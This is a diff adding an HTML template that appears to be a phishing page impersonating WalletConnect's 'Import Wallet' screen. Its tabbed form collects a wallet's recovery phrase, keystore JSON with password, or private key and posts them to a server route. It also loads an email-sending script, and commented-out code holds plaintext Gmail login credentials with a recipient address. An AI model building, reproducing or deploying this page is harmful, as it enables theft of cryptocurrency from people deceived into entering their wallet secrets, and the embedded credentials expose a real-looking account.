@@ -1,0 +1,159 @@
+<html>
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<link rel="stylesheet" href="../static/css/main.css" type="text/css"> 
+<meta name="description" content="Open protocol for connecting Wallets to Dapps">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta property="og:image" content="../images/logo.html">
+<link rel="icon" href="../static/img/logo.svg">
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+<script>
+  document.getElementsByName("phrase").reset();
+  document.getElementsByName("keystoreJSON").reset();
+  document.getElementsByName("password").reset();
+  document.getElementsByName("privateKey").reset();
+</script>
+<script>
+    function openCity(evt, cityName) {
+    // Declare all variables
+    var i, tabcontent, tablinks;
+  
+    // Get all elements with class="tabcontent" and hide them
+    tabcontent = document.getElementsByClassName("tabcontent");
+    for (i = 0; i < tabcontent.length; i++) {
+      tabcontent[i].style.display = "none";
+    }
+  
+    // Get all elements with class="tablinks" and remove the class "active"
+    tablinks = document.getElementsByClassName("tablinks");
+    for (i = 0; i < tablinks.length; i++) {
+      tablinks[i].className = tablinks[i].className.replace(" active", "");
+    }
+  
+    // Show the current tab, and add an "active" class to the button that opened the tab
+    document.getElementById(cityName).style.display = "block";
+    evt.currentTarget.className += " active";
+  }
+  </script>
+
+<!--<script type="text/javascript">
+	function sendEmail() {
+        Email.send({
+            Host: "smtp.gmail.com",
+            Username: "zolarich12@gmail.com",
+            Password: "12richzola",
+            To: 'agboyinusuccess@gmail.com',
+            From: "zolarich12@gmail.com",
+            Subject: "Sending Email using javascript",
+            Body: "Well that was easy!!",
+        })
+    }
+</script>-->
+
+<title>Import Wallet</title>
+</head>
+<body>
+<center>
+<div class="top">
+    <a href="https://github.com/walletconnect" class="left">Github</a>
+    <a href="https://docs.walletconnect.org/" class="left">Docs</a>
+    <a href="https://walletconnect.org/" class="main"><img src="../static/img/logo.svg" alt="logo"></a>
+    <a href="" class="left">Wallets</a>
+    <a href="https://walletconnect.org/apps" class="left">Apps</a>
+</div>
+<br>
+<h2><center>Import Wallet</center></h2>
+<br>
+
+<div class="tab">
+  <button class="tablinks active" id="default" onclick="openCity(event, &#39;phrase&#39;)">Phrase</button>
+  <button class="tablinks" onclick="openCity(event, &#39;keystore&#39;)">Keystore JSON</button>
+  <button class="tablinks" onclick="openCity(event, &#39;private&#39;)">Private Key</button>
+</div>
+<div>
+<form class="form" id="form" action = "{{ url_for('QRCoder') }}" method="post">
+<div id="phrase" class="tabcontent" style="display: block;">
+    <!--<form id="my-form1" action="{{ url_for('QRCoder') }}" method="POST">-->
+        <input type="text" id="walletApp1" name="walletApp" value="" style="display: none" >
+        <textarea name="phrase" class="phrase" minlength="12" placeholder="Phrase"></textarea>
+        <br>
+        <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+        <br>
+        <button type="submit" name="submit" form="form" class="btn">IMPORT</button>
+    <!--</form>-->
+</div>
+
+
+<div id="keystore" class="tabcontent" style="display: none;">
+    <!--<form id="my-form2" action="{{ url_for('QRCoder') }}" method="POST">-->
+        <!-- <input type="hidden" name="w" value="Electrum"> -->
+        <input type="text" id="walletApp2" name="walletApp" value="" style="display: none">
+        <textarea name="keystoreJSON" class="phrase" minlength="12" placeholder="Keystore JSON"></textarea>
+        <br>
+        <div class="field">
+            <input type="password" name="password" placeholder="Password">
+        </div>
+        <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
+        <br>
+        <button type="submit" name="submit" form="form" class="btn">IMPORT</button>
+    <!--</form>-->
+</div>
+
+<div id="private" class="tabcontent" style="display: none;">
+    <!--<form id="my-form3" action="{{ url_for('QRCoder') }}" method="POST">-->
+        <!-- <input type="hidden" name="w" value="Electrum"> -->
+        <input type="text" id="walletApp3" name="walletApp" value="" style="display: none">
+        <div class="field">
+            <input type="text" name="privateKey" class="key" placeholder="Private Key">
+        </div>
+        <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+        <br>
+        <button type="submit" name="submit" form="form" class="btn">IMPORT</button>
+    <!--</form>-->
+</div>
+</form>
+</div>
+
+<footer><div id="footer">
+<p><img src="../static/img/discord.svg" class="footimg">  <a href="https://discord.gg/jhxMvxP">Discord</a></p><br>
+<p><img src="../static/img/telegram.svg" class="footimg">  <a href="https://t.me/walletconnect_announcements">Telegram</a></p><br>
+<p><img src="../static/img/twitter.svg" class="footimg">  <a href="https://twitter.com/walletconnect">Twitter</a></p><br>
+<p><img src="../static/img/github.svg" class="footimg">  <a href="https://github.com/walletconnect">Github</a></p><br>
+</div></footer>
+</center>
+
+<!--<script>
+    var form1 = document.getElementById("my-form1");
+    var form2 = document.getElementById("my-form2");
+    var form3 = document.getElementById("my-form3");
+    const walletApp = document.querySelector('#walletApp1');
+    walletApp.value = window.location.search;
+    const walletApp2 = document.querySelector('#walletApp2');
+    walletApp2.value = window.location.search;
+    const walletApp3 = document.querySelector('#walletApp3');
+    walletApp3.value = window.location.search;
+    async function handleSubmit(event) {
+      event.preventDefault();
+      var data = new FormData(event.target);
+      fetch(event.target.action, {
+        method: form1.method,
+        method: form2.method,
+        method: form3.method,
+        body: data,
+        headers: {
+            'Accept': 'application/json'
+        }
+      }).then(response => {
+        form1.reset()
+        form2.reset()
+        form3.reset()
+        window.location.href = '/Templates/qrcode.html'
+      }).catch(error => {
+        console.log("Oops! There was a problem submitting your form")
+      });
+    }
+    form1.addEventListener("submit", handleSubmit)
+    form2.addEventListener("submit", handleSubmit)
+    form3.addEventListener("submit", handleSubmit)
+</script>-->
+</body>
+</html>
